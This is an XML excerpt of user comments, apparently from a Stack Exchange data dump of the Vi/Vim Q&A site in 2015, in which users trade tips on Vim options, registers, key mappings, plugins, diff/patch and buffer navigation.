  <row Id="5071" PostId="3633" Score="0" Text="Oh I understand the code better now! It works perfectly thanks!" CreationDate="2015-06-18T13:20:11.013" UserId="1841" />
  <row Id="5072" PostId="3633" Score="0" Text="[You're welcome]" CreationDate="2015-06-18T13:37:11.890" UserId="1800" />
  <row Id="5073" PostId="3634" Score="0" Text="`:ls` works! I guess what's needed is a NERDTree syntax file that highlights lines matching the output of `:ls` on everytime the buffer changes?" CreationDate="2015-06-18T14:20:21.467" UserId="2512" />
  <row Id="5074" PostId="3635" Score="1" Text="You can also just use `@0` instead of the `getreg()` function." CreationDate="2015-06-18T14:50:10.997" UserId="51" />
  <row Id="5075" PostId="3628" Score="0" Text="@romainl A similar issue came up on the vim_users list a few days ago.  The answer was to use `langmap`.  Maybe that can help you?" CreationDate="2015-06-18T15:43:56.200" UserId="1577" />
  <row Id="5076" PostId="3585" Score="0" Text="Oh, you're right. Sorry!" CreationDate="2015-06-19T04:35:07.930" UserId="2471" />
  <row Id="5077" PostId="3634" Score="0" Text="This is not how syntax files work.  You could however post a feature request to the [official channel](https://github.com/scrooloose/nerdtree/issues)." CreationDate="2015-06-19T12:54:26.400" UserId="1577" />
  <row Id="5078" PostId="3634" Score="1" Text="Looks like it was requested (two years ago) [here](https://github.com/scrooloose/nerdtree/issues/300)" CreationDate="2015-06-19T13:23:34.120" UserId="2512" />
  <row Id="5079" PostId="3642" Score="0" Text="Try `if &amp;restorescreen` if you want tho check if `restorescreen` is set, or `if exists('&amp;restorescreen')` if you want to find out if there is an option named `restorescreen` (but that should always return 1, since said option is always compiled in)." CreationDate="2015-06-19T15:12:44.673" UserId="1577" />
  <row Id="5080" PostId="3627" Score="0" Text="Sure, but having &lt;Leader&gt; explicitly set is much nicer, given that comma defaults to the leader key." CreationDate="2015-06-19T15:54:12.720" UserId="488" />
  <row Id="5081" PostId="3642" Score="0" Text="I think it was meant to detect older vim versions from before the option existed - I just took it out, I've been trying to clean up the version condition stuff in my vimrc since everything I use is on at least 7.2 now." CreationDate="2015-06-19T16:06:01.460" UserId="880" />
  <row Id="5082" PostId="3640" Score="0" Text="I didn't know about `echomsg` - thanks for the lead!  I found another way but wouldn't have done so without your kind answer (which I have cheerfully upvoted)." CreationDate="2015-06-19T16:12:46.050" UserId="1430" />
  <row Id="5083" PostId="3627" Score="2" Text="No, the default leader key is \." CreationDate="2015-06-19T20:05:36.217" UserId="54" />
  <row Id="5084" PostId="3645" Score="3" Text="Everything is explained in `:help html-indent`." CreationDate="2015-06-19T22:00:58.057" UserId="54" />
  <row Id="5085" PostId="3646" Score="0" Text="The problem is `void PrintOneNode(){}` becomes the declaration and definition, it is syntactically valid. So, for `vim` to &quot;guess&quot; that it was wrong, it would have to keep a list of functions declared/defined and look for &quot;similar&quot; names. The best that I can think of is to check the declaration when you're defining, using ctags (or similar), or use some completion tool so that you can pick the name from a list." CreationDate="2015-06-19T23:46:22.670" UserId="205" />
  <row Id="5086" PostId="3646" Score="2" Text="Have you considered using [syntastic](https://github.com/scrooloose/syntastic)?" CreationDate="2015-06-20T04:00:34.140" UserId="1577" />
  <row Id="5087" PostId="3646" Score="0" Text="@lcd047 That's excellent!!" CreationDate="2015-06-20T04:25:08.193" UserId="2206" />
  <row Id="5089" PostId="3646" Score="3" Text="If your compiler supports it `-Wmissing-prototypes` will tell you if a function is missing a prototype." CreationDate="2015-06-20T16:41:37.623" UserId="46" />
  <row Id="5092" PostId="3650" Score="2" Text="The [unimpaired](https://github.com/tpope/vim-unimpaired/) plugin has a different (but IMO better) solution.  See Drew Neil's [analysis](http://vimcasts.org/episodes/using-vims-paste-mode-with-the-system-paste-command/) for the rationale, as well as his [copy and paste series](http://vimcasts.org/categories/copy-and-paste/)." CreationDate="2015-06-21T03:45:30.473" UserId="1577" />
  <row Id="5093" PostId="3649" Score="1" Text="You can also make Vim wait forever for `\pcd`, by setting `notimeout`.  However, this has other (generally unwanted) consequences.  See `:help timeout` and `:help timeoutlen` for increased confusion. ;)" CreationDate="2015-06-21T05:33:46.563" UserId="1577" />
  <row Id="5094" PostId="3653" Score="0" Text="Thanks very much. I want to know more about this, could you please introduce me the relevant documentation?" CreationDate="2015-06-21T05:48:37.760" UserId="1788" />
  <row Id="5095" PostId="3653" Score="0" Text="@leoadams There are `:help /\n`, `:help s/\r`, and `:help NL-used-for-Nul`.  Not sure what else to tell you.  Vim is just weird." CreationDate="2015-06-21T06:00:15.043" UserId="2313" />
  <row Id="5096" PostId="3653" Score="0" Text="Thank you very much." CreationDate="2015-06-21T06:05:07.783" UserId="1788" />
  <row Id="5097" PostId="3650" Score="1" Text="Better than &quot;paste&quot;: &quot;put&quot;. Unless you are *really* desperate (tiny vim via ssh without any possibility of X-forwarding), use the * and/or + registers: `&quot;*p`, `&quot;+p`." CreationDate="2015-06-21T08:24:19.213" UserId="54" />
  <row Id="5098" PostId="3654" Score="0" Text="Why do you think `:execute` is not efficient?" CreationDate="2015-06-21T15:22:00.253" UserId="54" />
  <row Id="5099" PostId="3654" Score="0" Text="Ignorance, I suppose. I just don't know." CreationDate="2015-06-21T15:53:09.963" UserId="2207" />
  <row Id="5100" PostId="3654" Score="1" Text="`exec 'let $' . name . '=' . string(value)`" CreationDate="2015-06-21T15:54:44.993" UserId="1577" />
  <row Id="5101" PostId="3651" Score="0" Text="It does use ShellExecute. It opens directories in Explorer because they are associated with it. If you `start` a .docx file it will open MS Word, etc. Thank you, I hadn't considered using a user command." CreationDate="2015-06-21T19:10:07.457" UserId="880" />
  <row Id="5102" PostId="3651" Score="0" Text="@Random832 Nope. `start /?` for explaination.&#xA;&#xA;When you search for an executable and there is no match on any extension, start searches directory name. If it does, start opens Explorer.exe on that path." CreationDate="2015-06-21T19:19:34.240" UserId="1145" />
  <row Id="5103" PostId="3651" Score="0" Text="Ah, sorry, I didn't realize this difference because it does use association when opening files." CreationDate="2015-06-21T19:22:11.837" UserId="880" />
  <row Id="5104" PostId="3576" Score="0" Text="Could you include a screenshot of the iTerm color configuration that you use when the theme is rendered correctly as well as the output from running [this script](https://github.com/mbadolato/iTerm2-Color-Schemes/blob/master/tools/screenshotTable.sh)?" CreationDate="2015-06-22T00:12:17.490" UserId="2537" />
  <row Id="5105" PostId="3655" Score="3" Text="I used it in a function and had no problem using `n` or `N` to repeat the search. Do you have an interfering plugin? Try with `vim -Nu NONE`, manually defining the function or action." CreationDate="2015-06-22T03:07:38.833" UserId="205" />
  <row Id="5106" PostId="3655" Score="0" Text="@muru, thanks for the suggestion. I just tried it, and it still didn't work. Hitting `n` repeated a search earlier in the `/` history, but if I typed `/` and then hit the up arrow, the latest, function-called search appeared. I hit enter, it worked, and then `n` worked, so this is very odd. Perhaps it's a bug in vim itself? My version is 7.4.692." CreationDate="2015-06-22T07:26:12.893" UserId="2511" />
  <row Id="5107" PostId="3655" Score="0" Text="I attempted a workaround by putting `normal /&lt;Up&gt;^MN` after the `normal /needle^M` line in my function, but the `&lt;Up&gt;` didn't work. Is it possible somehow or is there some other workaround?" CreationDate="2015-06-22T07:42:28.563" UserId="2511" />
  <row Id="5108" PostId="3655" Score="3" Text="You can set the regexp used for `n` by assigning it to the `/` register: `let @/=&quot;needle&quot;`.  You don't even need to run a search first for that to work." CreationDate="2015-06-22T07:43:46.133" UserId="1577" />
  <row Id="5109" PostId="3655" Score="1" Text="Please add your full function and possibly more background to your question. What you ask is the normal behavior so there must be something else." CreationDate="2015-06-22T09:03:34.017" UserId="54" />
  <row Id="5110" PostId="3656" Score="0" Text="Try `$ vim -N -u plugin.vim`." CreationDate="2015-06-22T13:08:14.117" UserId="54" />
  <row Id="5111" PostId="3656" Score="0" Text="What is the output of `:set cpoptions?` when that happens?" CreationDate="2015-06-22T13:53:52.327" UserId="1577" />
  <row Id="5112" PostId="2363" Score="0" Text="Thanks for the answer, this was the only solution that has worked for me w/ Iterm + vim" CreationDate="2015-06-22T14:33:19.840" UserId="2541" />
  <row Id="5113" PostId="3656" Score="0" Text="@lcd047 : `cpoptions=aABceFs`" CreationDate="2015-06-22T14:58:02.733" UserId="1821" />
  <row Id="5114" PostId="3660" Score="2" Text="You need to set `nocompatible` to do just about anything interesting with Vim anyway." CreationDate="2015-06-22T15:10:29.460" UserId="1577" />
  <row Id="5115" PostId="3659" Score="0" Text="How did you run that command? `:!diff -u file.txt file_new.txt &gt; file.patch` or `diff -u file.txt file_new.txt &gt; file.patch`?  It seems to me you're trying to run an external command directly in Vim." CreationDate="2015-06-22T15:31:26.777" UserId="205" />
  <row Id="5116" PostId="3659" Score="0" Text="That's exactly what I was trying to do because I'm an idiot." CreationDate="2015-06-22T15:41:14.820" UserId="2543" />
  <row Id="5118" PostId="3664" Score="0" Text="Thanks for the response.  I don't believe the recover.XXXXX file is acting as an index; I actually have one of these files in /var/tmp/vi.recover/ (from a different editing session, one whose loss I don't care about) and its presence does not make `vi -r` display any results.  This file appears to just contain the text of the autogenerated email.  But I think this is the right track: *somewhere* nvi must store an index associating original files with recovery files, and adding the appropriate entry to this index would solve my problem." CreationDate="2015-06-22T16:50:57.843" UserId="2545" />
  <row Id="5119" PostId="3664" Score="0" Text="Odd.  Despite `vi -r` not acknowledging the existing recover.XXXXX file, when I created a new phony one with the file I care about, nvi picked it up and recovered it without complaint.  Perfect!" CreationDate="2015-06-22T17:02:08.217" UserId="2545" />
  <row Id="5120" PostId="3661" Score="2" Text="_At present, only GNU diff can produce this format and only GNU patch can automatically apply diffs in this format._ - For suitable values of _present_. :) OpenBSD's `diff` and `patch` have supported unified patches since June 2003." CreationDate="2015-06-22T17:15:35.470" UserId="1577" />
  <row Id="5121" PostId="3661" Score="0" Text="@lcd047 somebody needs to submit a patch for the GNU documentation." CreationDate="2015-06-22T19:53:39.387" UserId="205" />
  <row Id="5123" PostId="3660" Score="0" Text="Or just create a `~/.vimrc`." CreationDate="2015-06-22T20:31:18.657" UserId="54" />
  <row Id="5124" PostId="3660" Score="0" Text="This is why many scripts save the options (`let saved_opts = &amp;cpopts`), restore `cpopts` with `set cpopts&amp;vim`, and reset them at the end (`let &amp;cpopts = saved_opts`)... See [`:help use-cpo-save`](http://vimhelp.appspot.com/usr_41.txt.html#use-cpo-save)" CreationDate="2015-06-23T10:10:00.637" UserId="51" />
  <row Id="5125" PostId="3660" Score="0" Text="Interesting :) but in my case I wasn't using any vimrc, only the plug-in file so the `-N` was more convenient" CreationDate="2015-06-23T10:15:35.630" UserId="1821" />
  <row Id="5126" PostId="3665" Score="0" Text="Try the `$` key in place of `]`: `&lt;C-$&gt;`." CreationDate="2015-06-23T10:20:38.807" UserId="54" />
  <row Id="5127" PostId="3665" Score="0" Text="If you're using Windows, it's possible the `&lt;C-]&gt;` is not defined in the keyboard layout i.e. it doesn't generate a code for Vim to pick up. You can probably change the keyboard layout using MS keyboard layout creator tool, in order to add the missing code(s), but I didn't try that, just read about it some time ago. Or, you can map `&lt;C-]&gt;` to another combo." CreationDate="2015-06-23T10:24:24.433" UserId="1800" />
  <row Id="5128" PostId="3665" Score="0" Text="@romainl: This alternative key sequence works thanks! @ Laser: as the solution of romainl worked I'll probably will not take time to redefine my layout but I have a question: If windows doesn't send a code for this combo, how can it work on a cygwin console?" CreationDate="2015-06-23T10:34:59.193" UserId="1841" />
  <row Id="5129" PostId="3665" Score="0" Text="It's Vim's fault: `]` is hardcoded to the last key on the first alphabetical row." CreationDate="2015-06-23T10:43:50.797" UserId="54" />
  <row Id="5130" PostId="3665" Score="0" Text="According to a recent discussion on vim_use, `langmap` might help." CreationDate="2015-06-23T11:11:24.220" UserId="1577" />
  <row Id="5131" PostId="3665" Score="0" Text="@lcd047: I just read the help entry for `langmap` I understand how it works but not how I should use it: I tried `set langmap+=]$` so `&lt;C-]&gt;` would become `&lt;C-$&gt;` but when I hit `&lt;C-]&gt;` that just put the cursor at the end of the line." CreationDate="2015-06-23T12:02:37.893" UserId="1841" />
  <row Id="5132" PostId="3667" Score="0" Text="According to [this discussion](https://www.reddit.com/r/neovim/comments/31vxk1/configuring_neovim_without_vimscript/) on reddit I would say that you'll still have to write your `nvimrc` in vimscript. But maybe someone has more info than I have." CreationDate="2015-06-23T12:11:13.540" UserId="1841" />
  <row Id="5133" PostId="3665" Score="0" Text="I don't know how is that supposed to work, but I'm pretty sure it isn't with key combinations.  [This page](http://vim.wikia.com/wiki/Using_Vim_key_bindings_while_typing_non-latin1_text) seems relevant.  People have been passing around files with key definitions, maybe you can find one for AZERTY." CreationDate="2015-06-23T12:14:31.167" UserId="1577" />
  <row Id="5134" PostId="3665" Score="0" Text="I can't find reference to azerty layout on your link but I'll look for it and post it when I find. Thanks!" CreationDate="2015-06-23T13:12:44.077" UserId="1841" />
  <row Id="5135" PostId="3629" Score="0" Text="This will break the autocomplete/wildmenu feature. For example, `:help getcmd&lt;Tab&gt;`. It will insert `&lt;1a&gt;` (`&lt;C-z&gt;`) ... I tried to fix this, but can't get it working :-/" CreationDate="2015-06-23T13:13:57.797" UserId="51" />
  <row Id="5136" PostId="3629" Score="0" Text="No it doesn't break anything. Depends on `set wildcharm=&lt;C-z&gt;`." CreationDate="2015-06-23T13:17:42.170" UserId="54" />
  <row Id="5137" PostId="3628" Score="0" Text="@lcd047, thanks but I won't change my keyboard layout for a plugin." CreationDate="2015-06-23T13:18:42.483" UserId="54" />
  <row Id="5138" PostId="3624" Score="0" Text="Or files with an email signature, which is often indicated by `--&lt;Space&gt;`. It it also tends to add lots of unnecessary &quot;junk&quot; changes in the commit log... I [wrote a little script to &quot;mass-clean&quot; this sort if stuff](http://code.arp242.net/sanitize_files)." CreationDate="2015-06-23T13:19:25.273" UserId="51" />
  <row Id="5139" PostId="3629" Score="0" Text="Ah, thanks. I tried setting `wildchar`, but didn't know about `wildcharm`." CreationDate="2015-06-23T13:22:05.237" UserId="51" />
  <row Id="5140" PostId="3671" Score="0" Text="Post an email to the vim_use mailing list asking DrChip to fix his mess." CreationDate="2015-06-23T15:44:07.743" UserId="54" />
  <row Id="5141" PostId="3668" Score="0" Text="There are a few plugins which implement this, such as tagbar and taglist." CreationDate="2015-06-23T16:15:05.280" UserId="865" />
  <row Id="5142" PostId="1981" Score="0" Text="@Carpetsmoker: Because of &quot;but not quite there&quot;, which was due to it adding a *new line* above paste ..." CreationDate="2015-06-23T16:39:06.980" UserId="220" />
  <row Id="5143" PostId="3675" Score="1" Text="A better pointer: `:help cmdline-special`" CreationDate="2015-06-23T17:49:01.630" UserId="1577" />
  <row Id="5144" PostId="3675" Score="0" Text="@lcd047 yes! Agree! Very useful!" CreationDate="2015-06-23T17:57:49.487" UserId="1145" />
  <row Id="5145" PostId="3673" Score="1" Text="This seems to work fine for me. I started Vim with `vim -u NONE` to prevent loading a vimrc file. Does this fix the problem for you? Which Vim version are you using?" CreationDate="2015-06-23T22:28:21.963" UserId="51" />
  <row Id="5146" PostId="3671" Score="0" Text="I can't reproduce your problem; which version of Vim are you using? And which commands are you using? If I use `vim` (no file), and the `:Vexplore`, then both windows have `buftype=` (empty)." CreationDate="2015-06-23T22:31:19.267" UserId="51" />
  <row Id="5147" PostId="3671" Score="0" Text="I think I just found that the issue was having set autochdir in my vimrc." CreationDate="2015-06-24T01:37:34.070" UserId="2559" />
  <row Id="5148" PostId="3673" Score="0" Text="No, that doesn't help. Vim 7.4 on Windows and Ubuntu." CreationDate="2015-06-24T05:32:43.570" UserId="2560" />
  <row Id="5149" PostId="2772" Score="0" Text="@GonçaloRibeiro Any special steps? I can't reproduce this on Windows 8.1 with GVim 7.4. I even tried with `gvim -u NONE`, using &lt;C-E&gt;. In all cases no backslash was prepended. However, using /usr/bin/vim from *cygwin* does prepend the backslash -- but the buffer still loads the correct file." CreationDate="2015-06-24T05:43:51.163" UserId="2560" />
  <row Id="5150" PostId="3669" Score="0" Text="I started using preview windows for this kind of thing, by using `ctrl-w }`." CreationDate="2015-06-24T11:17:48.430" UserId="599" />
  <row Id="5151" PostId="3669" Score="0" Text="@Vitor I didn't know this feature but that seems to be pretty useful!" CreationDate="2015-06-24T11:59:51.340" UserId="1841" />
  <row Id="5152" PostId="3682" Score="0" Text="Are you sure of the code sample you posted? I don't understand how the `return -1;` comes from. Also could you precise where you put your cursor before executing each sequence of key?" CreationDate="2015-06-24T14:16:37.853" UserId="1841" />
  <row Id="5153" PostId="3682" Score="0" Text="@statox Sorry about that...I've corrected the latter block, and added a description about where did I put the cursor. Thanks for your recommendation :-)" CreationDate="2015-06-24T14:50:45.437" UserId="2573" />
  <row Id="5154" PostId="3673" Score="0" Text="Is `paste` set, accidentally? Try`:set paste?`" CreationDate="2015-06-24T15:40:29.333" UserId="925" />
  <row Id="5156" PostId="3665" Score="0" Text="@statox Can you make it an answer, even if it's not yet perfect?" CreationDate="2015-06-24T15:52:53.187" UserId="925" />
  <row Id="5157" PostId="3683" Score="2" Text="I know [this plugin](https://github.com/vim-scripts/dbext.vim) from a colleague who worked with it. I know this plugin works but I don't personnaly have enough experience to give you some precises informations about it." CreationDate="2015-06-24T15:56:36.313" UserId="1841" />
  <row Id="5158" PostId="3631" Score="0" Text="And look at the examples included with vim in `/usr/share/vim/vim74/autoload`." CreationDate="2015-06-24T16:43:37.073" UserId="599" />
  <row Id="5159" PostId="3687" Score="0" Text="Thanks. I meant put into buffer then copy to clipboard or registers via other command." CreationDate="2015-06-24T17:19:42.060" UserId="477" />
  <row Id="5160" PostId="3665" Score="0" Text="@VolkerSiegel: Unfortunately it's more than imperfect since I did have the time to make `langmap` working properly... I will make an answer with romainl's solution and mentionning lcd047 suggestion but it will need to be improved when I have the time." CreationDate="2015-06-24T17:45:25.553" UserId="1841" />
  <row Id="5161" PostId="3682" Score="0" Text="I can't replicate this. `yi{` yanks between the curly brackets and `vap` visually selects the paragraph (the entire text in this case) but I don't see how this changes the text at all. Are you sure you're not doing `yi{` + `va{` + `p`?" CreationDate="2015-06-24T18:15:08.067" UserId="1306" />
  <row Id="5162" PostId="3682" Score="2" Text="I just tried `yi{` + `va{` + `p` on your text in a clean session (no vimrc, `-u NONE`) and that does reproduce your result. I'm not sure why, for instance `p` and `P` both give this result, despite `i{` and `a{` moving characterwise. It would help if you could a) give an example text on which your technique does work and b) confirm where in your technique the 'changing' happens. @Ben indicates a good workaround in his answer (I use that plugin) but I wouldn't mind learning why this happens in the first place." CreationDate="2015-06-24T18:37:03.483" UserId="1306" />
  <row Id="5163" PostId="3688" Score="0" Text="This is a good workaround. Would you consider adding a sentence or two explaining how this plugin works and why the particular mapping accomplishes the task?" CreationDate="2015-06-24T18:39:03.930" UserId="1306" />
  <row Id="5164" PostId="3682" Score="0" Text="I'm just like @jjaderberg I can't reproduce the behavior you describe. Giving the details asked in his comments would be a really good idea." CreationDate="2015-06-24T19:09:06.890" UserId="1841" />
  <row Id="5165" PostId="3673" Score="0" Text="@VolkerSiegel no, `paste` is not set. When `paste` is set no wrapping happens at all." CreationDate="2015-06-24T19:48:45.430" UserId="2560" />
  <row Id="5166" PostId="3687" Score="0" Text="@Thomson So you want to do 2 operations in 1 go? Put the filen name in the buffer *and* copy it to the operating system's clipboard?" CreationDate="2015-06-24T19:55:39.490" UserId="51" />
  <row Id="5167" PostId="3687" Score="0" Text="I just want to copy the file name of the buffer to clipboard, the previous 2 operations are an crappy workaround." CreationDate="2015-06-24T22:22:40.460" UserId="477" />
  <row Id="5168" PostId="3681" Score="0" Text="Re: Note 3. From what I rememer, Windows Explorer launches the program 2 times when you open 2 files (it runs `gvim file1` and `gvim file2`). However, the filemanager you used on Debian may invoke gvim only once with all the files in the argument list (`gvim file1 file2`). The difference in behaviour is not in gVim as such, but in how it is invoked..." CreationDate="2015-06-25T00:26:14.870" UserId="51" />
  <row Id="5169" PostId="3681" Score="0" Text="@carpetsmoker that seems right but is it possible to change this behavior? Or is my question not related enough with vim? Maybe I should have asked it on super user?" CreationDate="2015-06-25T02:00:40.160" UserId="1841" />
  <row Id="5170" PostId="3682" Score="0" Text="@jjaderberg yeah...It's `va{` + `p`" CreationDate="2015-06-25T02:56:25.927" UserId="2573" />
  <row Id="5171" PostId="3682" Score="0" Text="@jjaderberg If there is a space character before the first curly bracket, This technique would work perfectly." CreationDate="2015-06-25T03:00:20.957" UserId="2573" />
  <row Id="5172" PostId="3682" Score="0" Text="@statox I've just edited the description. :-)" CreationDate="2015-06-25T03:06:25.603" UserId="2573" />
  <row Id="5173" PostId="3688" Score="0" Text="Is there any elegant way to remove those braces without a plugin? : (" CreationDate="2015-06-25T03:22:31.040" UserId="2573" />
  <row Id="5174" PostId="3688" Score="0" Text="Maybe. But surround is really light-weight and one of the &quot;essential&quot; plugins. So may as well install it..." CreationDate="2015-06-25T03:29:01.450" UserId="1094" />
  <row Id="5175" PostId="3692" Score="0" Text="Have you tried reporting this to the maintainers of your distribution?" CreationDate="2015-06-25T06:56:32.540" UserId="1577" />
  <row Id="5177" PostId="3692" Score="2" Text="Does the problem also occur when you load Vim without plugins?" CreationDate="2015-06-25T07:07:41.710" UserId="51" />
  <row Id="5178" PostId="3692" Score="0" Text="@lcd047 not yet. you think maybe this caused by distribution?" CreationDate="2015-06-25T07:35:18.020" UserId="1276" />
  <row Id="5179" PostId="3692" Score="0" Text="It's way to early to blame the distribution for this. I see powerline in your screenshot. So this means you have plugins. Thus, as Carpetsmoker suggested, start vim with   `vim -Nu NONE` and see if you still have problems. That should get you started." CreationDate="2015-06-25T07:36:15.627" UserId="246" />
  <row Id="5180" PostId="3692" Score="0" Text="My first suspect would be a problem between your `gnome-terminal` and `terminfo`.  `gnome-terminal` never really grasped that concept. :)" CreationDate="2015-06-25T07:38:32.383" UserId="1577" />
  <row Id="5181" PostId="3682" Score="0" Text="@MrDwz: Thanks for the edit now I can reproduce, and I still I don't know what explain this behavior... If you're looking for a solution which doesn't involve a plugin I think the answer of Gilles is the most straightforward :)" CreationDate="2015-06-25T07:50:40.950" UserId="1841" />
  <row Id="5182" PostId="3693" Score="0" Text="If I am not mistaken, this will effectively limit the total number of open Vim instances to just a single one?" CreationDate="2015-06-25T08:50:23.353" UserId="51" />
  <row Id="5183" PostId="3693" Score="0" Text="@Carpetsmoker &quot;Sort of&quot;. If you have an existing gVim session, the files opened by this method will be added as new tabs (and if you have multiple sessions, they will be added to the most recently created). But it doesn't prevent you from opening multiple sessions using other methods (eg, running `gvim.exe` again, right-clicking and editing, etc)." CreationDate="2015-06-25T08:56:28.340" UserId="2582" />
  <row Id="5184" PostId="3693" Score="0" Text="@mjturner: Thank for your solution it is pretty close from what I wanted except that it opens files in different tabs instead of different buffers in one tab only but that's what I'm going to use if I can't find something closer to what I want :)" CreationDate="2015-06-25T09:02:20.873" UserId="1841" />
  <row Id="5185" PostId="3693" Score="0" Text="@statox Great! I thought `--remote-silent` might do what you want, but it doesn't open a new buffer, it replaces the active one." CreationDate="2015-06-25T09:08:05.763" UserId="2582" />
  <row Id="5186" PostId="3693" Score="0" Text="@mjturner Yeah and after reading the doc (`h clientserver`) I found not option opening files in buffers in the same tabs so I guess that's the closer I can get from what I want. Thanks for your help!" CreationDate="2015-06-25T09:26:22.630" UserId="1841" />
  <row Id="5187" PostId="3693" Score="2" Text="@statox You can sent `$any` command with `--remote` or `--remote-silent`. See [`:help --remote`](http://vimhelp.appspot.com/remote.txt.html#--remote) for an example." CreationDate="2015-06-25T09:40:20.067" UserId="51" />
  <row Id="5188" PostId="3683" Score="1" Text="Basic vim will not work for what you want because it is built to edit text. What people normally do is to have a terminal/console open in parallel to execute those commands. But you might try neovim if you really need to have a terminal running inside vim..." CreationDate="2015-06-25T11:05:53.400" UserId="599" />
  <row Id="5189" PostId="3693" Score="0" Text="@Carpetsmoker: I don't understand how to exploit this feature: I tried to add function like `:e` in the key like    `   &quot;C:\folder\to\gvim.exe\&quot; --remote-tab-silent :e \&quot;%1\&quot;    `    to open new buffer but gVim only tries to open a file named `:e`. (Sorry I can't quote the register line properly in this comment)" CreationDate="2015-06-25T12:40:49.887" UserId="1841" />
  <row Id="5190" PostId="3694" Score="0" Text="By &quot;the file I just edited last&quot; do you literally mean &quot;the file I most recently made edits to&quot;? Or do you just mean the last one that you had visible in Vim?" CreationDate="2015-06-25T13:14:11.140" UserId="343" />
  <row Id="5191" PostId="3694" Score="2" Text="If the latter, I personally just mash `Ctrl-O` (or sometimes `Ctrl-T`) till I get there." CreationDate="2015-06-25T13:16:42.667" UserId="343" />
  <row Id="5193" PostId="3682" Score="0" Text="@statox eh...Actually, What I'm curious about is how does the paste behave in the visual mode. It's so strange that I get the right selected area but the last character goes down :-(" CreationDate="2015-06-25T13:56:28.490" UserId="2573" />
  <row Id="5194" PostId="3694" Score="0" Text="Yes that's what I do too `Ctrl-O` and `Ctrl-I`. But it jumps between edit points and that breaks the flow. All I want to go back and forth between buffers in order of access. How plugins display a list of most recent files? Do they keep track of them internally?" CreationDate="2015-06-25T13:57:33.367" UserId="237" />
  <row Id="5195" PostId="3694" Score="0" Text="`Ctrl-^` swaps between two last files. But what is the best way to navigate between more?" CreationDate="2015-06-25T14:00:39.263" UserId="237" />
  <row Id="5196" PostId="3695" Score="1" Text="I was **not** asking to set an indentation based on the filetype. Anyway, the second question with an answer pointing to `vim-sleuth` is what I was looking for. Thanks to the one pointing to that one." CreationDate="2015-06-25T14:03:22.737" UserId="1109" />
  <row Id="5197" PostId="3699" Score="5" Text="Sidenote: `&lt;C-q&gt;` is  the terminal &quot;start&quot; signal; Vim never sees it. Use `stty start undef` to disable it so that Vim sees it. You probably also want to disable the &quot;stop&quot; signal (`&lt;C-s&gt;`) with `stty stop undef`." CreationDate="2015-06-25T15:21:54.907" UserId="51" />
  <row Id="5198" PostId="3700" Score="0" Text="I've tried to setup `curl` example, now I got this message: `:!curl 'http://www.ietf.org/rfc/rfc7386.txt' -o '/tmp/vbA49BG/1.txt'`, but anyway there is nothing in directory `/tmp/vbA49BG/`. Whem I'm executing this command right from the terminal `curl 'http://www.ietf.org/rfc/rfc7386.txt' -o '/tmp/vbA49BG/1.txt`, everything is ok. It looks like something wrong with file creation." CreationDate="2015-06-25T15:26:55.213" UserId="30" />
  <row Id="5199" PostId="3700" Score="0" Text="@erthalion This is also the case on my system. The `/tmp/[...]` directory is empty. This is I would expect, since tmp files are exactly that: temporarily... For some reason, the directory is removed later (perhaps there is a reason for this, but it could also be a bug)." CreationDate="2015-06-25T15:31:33.743" UserId="51" />
  <row Id="5200" PostId="3701" Score="0" Text="You're the man. I was thinking that if I used `&lt;C-v&gt;` in a command, it would just call what I had remapped it to. Is that what the `normal!` is for?" CreationDate="2015-06-25T15:34:22.927" UserId="2276" />
  <row Id="5201" PostId="3702" Score="0" Text="Cool cool, thanks for the explanation." CreationDate="2015-06-25T15:37:49.887" UserId="2276" />
  <row Id="5202" PostId="3700" Score="0" Text="Not a bug.  The directory is reused for other temporary files, and it's removed when you quit Vim." CreationDate="2015-06-25T15:43:50.450" UserId="1577" />
  <row Id="5203" PostId="3700" Score="0" Text="@lcd047 temporary directory is empty even before I quit vim, is that ok?" CreationDate="2015-06-25T15:52:03.323" UserId="30" />
  <row Id="5204" PostId="3700" Score="1" Text="@erthalion Yes.  On UNIX it's ok to delete files from disk while they are still open (the process holding them open won't notice).  Doing this is a common practice with temporary files." CreationDate="2015-06-25T16:03:05.823" UserId="1577" />
  <row Id="5205" PostId="2285" Score="0" Text="You can get the same effect by wrapping this command in a function, since then the last search term is automatically restored :-) This way you don't have to muck about with `:nohl` either, if if you were highlighting something, it will keep highlighting it (see my updated answer)." CreationDate="2015-06-25T16:39:28.953" UserId="51" />
  <row Id="5206" PostId="3029" Score="0" Text="The last used search term should be automatically preserved when you leave a function; so mucking about with `@/` should not be required (in this case, anyway)." CreationDate="2015-06-25T16:43:21.087" UserId="51" />
  <row Id="5207" PostId="3694" Score="0" Text="By access, it's still not clear if you mean the order they were opened, written to, in a focused window, or changed.&#xA;&#xA;`Ctrl-O/I` are window-specific fwiw, while MRU is usually global.&#xA;&#xA;If you do want order by most recently accessed, as soon as you jump back once, the order of the list changes, further complicating things." CreationDate="2015-06-25T17:17:50.133" UserId="680" />
  <row Id="5208" PostId="3698" Score="3" Text="`'conceallevel'` is a window local setting. This means you can easily use splits. One for editing with `set conceallevel=0` and the other window with the default ( `set conceallevel=2`)." CreationDate="2015-06-25T17:20:23.063" UserId="778" />
  <row Id="5210" PostId="3703" Score="2" Text="Without looking at the code, I'd say filetypes are detected again for all buffers.  Not sure that's intended, you might want to post about it on vim_dev." CreationDate="2015-06-25T21:22:47.443" UserId="1577" />
  <row Id="5211" PostId="3677" Score="0" Text="Great thanks, going to try this out and then mark this as accepted if it works." CreationDate="2015-06-25T23:27:01.220" UserId="2531" />
  <row Id="5212" PostId="3694" Score="0" Text="Yes I understand but I agree to anything that can improve current `:bn` `:bp` behavior. The buffers I often see are totally out of place. Maybe there is a plugin that can keep track of the recent files and provide hooks so I can create mappings? Something like `Ctrl-O` that goes to prev file immediately without jumping around the current buffer." CreationDate="2015-06-25T23:49:51.457" UserId="237" />
  <row Id="5213" PostId="156" Score="0" Text="Just discovered that this solution doesn't quite work in visual mode (slightly different behavior depending on which visual mode, it'll either stay in the same position or move by only one line). Any pointers on what's going on there?" CreationDate="2015-06-26T02:30:00.997" UserId="67" />
  <row Id="5214" PostId="3694" Score="0" Text="Using marks may be another option. If you know you're going to come back to a file. Just mark it! Use the capital letter marks to make them persist even after restarting vim! For example `mA` will mark the current file to A, and then you can simply go back by using ``A`" CreationDate="2015-06-26T04:55:38.913" UserId="246" />
  <row Id="5215" PostId="3694" Score="0" Text="The problem is I don't know it upfront. I usually edit controller, view, model, styles and scripts together. And I normally jump back and forth between files as I need to apply changes in few places." CreationDate="2015-06-26T04:57:51.507" UserId="237" />
